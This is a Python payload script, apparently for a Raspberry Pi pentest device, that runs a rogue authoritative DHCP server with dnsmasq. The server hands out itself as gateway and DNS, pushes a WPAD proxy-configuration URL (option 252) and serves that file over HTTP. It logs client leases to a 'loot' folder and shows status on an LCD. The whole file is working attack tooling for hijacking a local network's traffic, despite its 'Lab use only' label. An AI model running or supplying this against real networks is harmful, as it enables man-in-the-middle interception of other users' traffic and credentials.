#!/usr/bin/env python3
"""
Rogue DHCP (WPAD) – Lab use only
--------------------------------
- Starts a rogue DHCP server on a chosen interface
- Sends WPAD option (DHCP option 252) pointing to a URL
- Displays status on LCD, stop with KEY3

"""

import os
import sys
import time
import ipaddress
import threading
import subprocess
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..")))

import RPi.GPIO as GPIO  # type: ignore
import LCD_1in44, LCD_Config  # type: ignore
from PIL import Image, ImageDraw, ImageFont  # type: ignore

# Shared input helper (WebUI virtual + GPIO)
from payloads._input_helper import get_button

WIDTH, HEIGHT = 128, 128
KEY_UP = 6
KEY_DOWN = 19
KEY_PRESS = 13
KEY3 = 16

LOOT_DIR = "/root/Raspyjack/loot/DHCP"
popup_message = ""
popup_until = 0.0
WPAD_DIR = "/tmp/raspyjack_wpad"


def lcd_init():
    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    return lcd


def draw_lines(lcd, lines, color="white", bg="black"):
    img = Image.new("RGB", (WIDTH, HEIGHT), bg)
    d = ImageDraw.Draw(img)
    font = ImageFont.load_default()
    y = 5
    for line in lines:
        if line:
            d.text((5, y), line[:18], font=font, fill=color)
            y += 14
    lcd.LCD_ShowImage(img, 0, 0)


def popup(msg, duration=1.5):
    global popup_message, popup_until
    popup_message = msg
    popup_until = time.time() + duration


def draw_status(lcd, iface):
    lines = ["Rogue DHCP", f"IF:{iface}", "WPAD:252", "KEY3=Stop"]
    if time.time() < popup_until and popup_message:
        lines.append(popup_message)
    draw_lines(lcd, lines)


def _run(cmd):
    return subprocess.run(cmd, capture_output=True, text=True)


def _iface_ip_cidr(name):
    res = _run(["ip", "-4", "addr", "show", "dev", name])
    if res.returncode != 0:
        return None
    for line in res.stdout.splitlines():
        line = line.strip()
        if line.startswith("inet "):
            return line.split()[1]
    return None


def list_interfaces():
    ifaces = []
    for name in os.listdir("/sys/class/net"):
        if name == "lo":
            continue
        cidr = _iface_ip_cidr(name)
        if cidr:
            ifaces.append((name, cidr))
    ifaces.sort(key=lambda x: x[0])
    return ifaces


def select_interface_menu(lcd):
    ifaces = list_interfaces()
    if not ifaces:
        return None, None
    idx = 0
    offset = 0
    while True:
        lines = ["Select IFACE"]
        window = ifaces[offset:offset + 5]
        for i, (name, cidr) in enumerate(window):
            real_idx = offset + i
            mark = ">" if real_idx == idx else " "
            lines.append(f"{mark}{name} {cidr.split('/')[0]}")
        lines.append("KEY3=Back")
        draw_lines(lcd, lines)
        time.sleep(0.1)
        btn = get_button({"UP": KEY_UP, "DOWN": KEY_DOWN, "OK": KEY_PRESS, "KEY3": KEY3}, GPIO)
        if btn == "KEY3":
            return None, None
        if btn == "UP":
            idx = max(0, idx - 1)
        elif btn == "DOWN":
            idx = min(len(ifaces) - 1, idx + 1)
        if idx < offset:
            offset = idx
        elif idx >= offset + 5:
            offset = idx - 4
        if btn == "OK":
            name, cidr = ifaces[idx]
            return name, cidr


def select_mask_menu(lcd, cidr):
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        base_ip = str(net.network_address)
    except Exception:
        return cidr
    options = ["/24", "/16"]
    idx = 0
    while True:
        lines = ["Select mask"]
        for i, opt in enumerate(options):
            mark = ">" if i == idx else " "
            lines.append(f"{mark}{base_ip}{opt}")
        lines.append("KEY3=Back")
        draw_lines(lcd, lines)
        time.sleep(0.1)
        btn = get_button({"UP": KEY_UP, "DOWN": KEY_DOWN, "OK": KEY_PRESS, "KEY3": KEY3}, GPIO)
        if btn == "KEY3":
            return cidr
        if btn == "UP":
            idx = max(0, idx - 1)
        elif btn == "DOWN":
            idx = min(len(options) - 1, idx + 1)
        if btn == "OK":
            chosen = options[idx]
            return f"{base_ip}{chosen}"


def write_dnsmasq_conf(iface, gw_ip, dhcp_start, dhcp_end, wpad_url, log_file):
    conf = "\n".join([
        f"interface={iface}",
        "bind-interfaces",
        "dhcp-authoritative",
        f"dhcp-range={dhcp_start},{dhcp_end},12h",
        f"dhcp-option=3,{gw_ip}",
        f"dhcp-option=6,{gw_ip}",
        f"dhcp-option=252,{wpad_url}",
        "",
    ])
    path = "/tmp/raspyjack_rogue_dhcp.conf"
    with open(path, "w") as f:
        f.write(conf)
    return path


def write_wpad_file(gw_ip):
    os.makedirs(WPAD_DIR, exist_ok=True)
    wpad_path = os.path.join(WPAD_DIR, "wpad.dat")
    # Basic PAC: direct only (customize if needed)
    content = (
        "function FindProxyForURL(url, host) {\n"
        "  return \"DIRECT\";\n"
        "}\n"
    )
    with open(wpad_path, "w") as f:
        f.write(content)
    return wpad_path


def log_watch_loop(log_file):
    try:
        with open(log_file, "r") as f:
            f.seek(0, os.SEEK_END)
            while True:
                line = f.readline()
                if not line:
                    time.sleep(0.2)
                    continue
                if "DHCPACK" in line:
                    # Example: DHCPACK(eth1) 172.17.0.60 aa:bb:cc:dd:ee:ff host
                    parts = line.strip().split()
                    ip = ""
                    mac = ""
                    host = ""
                    for p in parts:
                        if p.count(".") == 3:
                            ip = p
                        elif ":" in p and len(p) >= 11:
                            mac = p
                    if parts:
                        host = parts[-1]
                    msg = f"IP {ip}" if ip else "IP assigned"
                    if host and host != ip:
                        msg = f"{host[:8]} {ip}"
                    popup(msg, duration=2.0)
    except Exception:
        return


def _clean_token(s):
    return "".join(ch for ch in s if ch.isalnum() or ch in "._-:/")


def _sanitize_iface(name):
    return "".join(ch for ch in name if ch.isalnum() or ch in "_-")


def main():
    lcd = lcd_init()
    GPIO.setmode(GPIO.BCM)
    GPIO.setup(KEY_UP, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(KEY_DOWN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(KEY_PRESS, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(KEY3, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    if subprocess.call(["which", "dnsmasq"], stdout=subprocess.DEVNULL) != 0:
        draw_lines(lcd, ["dnsmasq missing", "Install first", "", "KEY3=Exit"])
        while True:
            if get_button({"KEY3": KEY3}, GPIO) == "KEY3":
                break
            time.sleep(0.1)
        return 1

    iface, cidr = select_interface_menu(lcd)
    if not iface or not cidr:
        draw_lines(lcd, ["Rogue DHCP", "No interface", "", "KEY3=Exit"])
        while True:
            if get_button({"KEY3": KEY3}, GPIO) == "KEY3":
                break
            time.sleep(0.1)
        return 1

    iface = _sanitize_iface(iface)

    target = select_mask_menu(lcd, cidr)
    net = ipaddress.ip_network(target, strict=False)
    gw_ip = str(net.network_address + 1)
    dhcp_start = str(net.network_address + 50)
    dhcp_end = str(net.network_address + 150)
    wpad_url = f"http://{gw_ip}/wpad.dat"

    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H%M%S")
    log_file = f"{LOOT_DIR}/rogue_dhcp_{ts}.log"

    draw_lines(lcd, ["Rogue DHCP", f"IF: {iface}", f"NET: {target[:14]}", "Starting..."])

    # Assign gateway IP to interface (stealth-ish, no bridge here)
    _run(["ip", "addr", "flush", "dev", iface])
    _run(["ip", "addr", "add", f"{gw_ip}/{net.prefixlen}", "dev", iface])
    _run(["ip", "link", "set", iface, "up"])

    conf = write_dnsmasq_conf(
        iface,
        _clean_token(gw_ip),
        _clean_token(dhcp_start),
        _clean_token(dhcp_end),
        _clean_token(wpad_url),
        _clean_token(log_file),
    )
    write_wpad_file(gw_ip)
    log_fh = open(log_file, "a")
    dnsmasq = subprocess.Popen(
        ["dnsmasq", "-C", conf, "-d"],
        stdout=log_fh,
        stderr=log_fh,
    )
    httpd = subprocess.Popen(
        ["python3", "-m", "http.server", "80", "--bind", gw_ip, "--directory", WPAD_DIR],
        stdout=log_fh,
        stderr=log_fh,
    )
    t = threading.Thread(target=log_watch_loop, args=(log_file,), daemon=True)
    t.start()

    draw_status(lcd, iface)
    try:
        while True:
            if get_button({"KEY3": KEY3}, GPIO) == "KEY3":
                break
            # show popup if any
            draw_status(lcd, iface)
            time.sleep(0.2)
    finally:
        try:
            dnsmasq.terminate()
            dnsmasq.wait(timeout=3)
        except Exception:
            pass
        try:
            httpd.terminate()
            httpd.wait(timeout=3)
        except Exception:
            pass
        _run(["ip", "addr", "flush", "dev", iface])
        LCD_1in44.LCD().LCD_Clear()
        GPIO.cleanup()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
